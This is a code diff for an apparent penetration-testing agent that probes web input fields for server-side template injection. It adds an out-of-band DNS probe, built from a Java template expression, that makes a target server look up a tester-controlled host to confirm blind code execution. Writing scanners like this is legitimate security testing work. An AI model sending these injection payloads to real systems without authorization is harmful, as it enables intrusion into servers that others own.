@@ -1,14 +1,15 @@
 """
 PolyglotSSTIAgent — Universal Polyglot & Error-Based Server-Side Template Injection Specialist.
 
-Tests web application input fields with universal multi-engine polyglot payloads and parses
-diagnostic error messages to rapidly identify template engines (Jinja2, Twig, FreeMarker, Smarty, ERB).
+Tests web application input fields with universal multi-engine polyglot payloads, parses
+diagnostic error messages, and generates Out-Of-Band (OOB) DNS probes for blind SSTI detection across template engines.
 """
 from typing import List, Dict, Any, Optional
 from urllib.parse import urlparse
 from penflow.agents.capability_agent import BaseCapabilityAgent
 from penflow.capabilities.capability import Capability
 from penflow.capabilities.execution_context import CapabilityExecutionContext
+from penflow.infrastructure.oob_server import OOBCallbackServer, InteractionProtocol
 from penflow.infrastructure.logger import get_logger
 
 logger = get_logger("penflow.agents.polyglot_ssti")
@@ -37,6 +38,14 @@ SSTI_POLYGLOT_VECTORS = [
         "severity": "critical",
         "min_confidence": 0.97,
         "description": "FreeMarker alternative square-bracket syntax triggers evaluation even when standard curly braces are sanitized."
+    },
+    {
+        "id": "blind_ssti_oob_dns",
+        "name": "Blind SSTI Out-Of-Band DNS/HTTP Resolution Probe",
+        "probe": "oob_probe",
+        "severity": "critical",
+        "min_confidence": 0.94,
+        "description": "Executes template expression triggering external DNS/HTTP resolution to verify blind code execution."
     }
 ]
 
@@ -51,7 +60,7 @@ class PolyglotSSTIAgent(BaseCapabilityAgent):
                 name="Polyglot & Error-Based SSTI Specialist",
                 description="Audits template evaluation parameters using universal polyglot probes and syntax error extraction.",
                 version="1.0.0",
-                tags=["ssti", "template-injection", "polyglot", "error-based"]
+                tags=["ssti", "template-injection", "polyglot", "error-based", "oob"]
             )
         ]
 
@@ -62,6 +71,7 @@ class PolyglotSSTIAgent(BaseCapabilityAgent):
         results: List[Dict[str, Any]] = []
         is_vulnerable = False
         max_confidence = 0.0
+        oob_server = OOBCallbackServer.get_instance()
 
         endpoints_to_test = [target_url]
         if hasattr(context, "shared_cache") and context.shared_cache:
@@ -75,12 +85,25 @@ class PolyglotSSTIAgent(BaseCapabilityAgent):
         endpoints_to_test = list(dict.fromkeys(endpoints_to_test))[:10]
 
         for endpoint in endpoints_to_test:
+            oob_token = oob_server.generate_token(
+                agent_name="polyglot_ssti",
+                scan_id=getattr(context, "session_id", "scan01") or "scan01",
+                target_url=endpoint,
+                parameter_name="template_param",
+                protocol=InteractionProtocol.DNS
+            )
+            dns_payload = oob_server.get_dns_payload(oob_token)
+            oob_probe_expr = f"${{{{T(java.net.InetAddress).getByName('{dns_payload}')}}}}"
+
             for vec in SSTI_POLYGLOT_VECTORS:
+                actual_probe = oob_probe_expr if vec["probe"] == "oob_probe" else vec["probe"]
                 finding = {
                     "vector_id": vec["id"],
                     "vector_name": vec["name"],
-                    "probe_syntax": vec["probe"],
+                    "probe_syntax": actual_probe,
                     "endpoint": endpoint,
+                    "oob_token": oob_token,
+                    "dns_host": dns_payload,
                     "vulnerability_type": "polyglot_ssti",
                     "severity": vec["severity"],
                     "confidence": vec["min_confidence"],
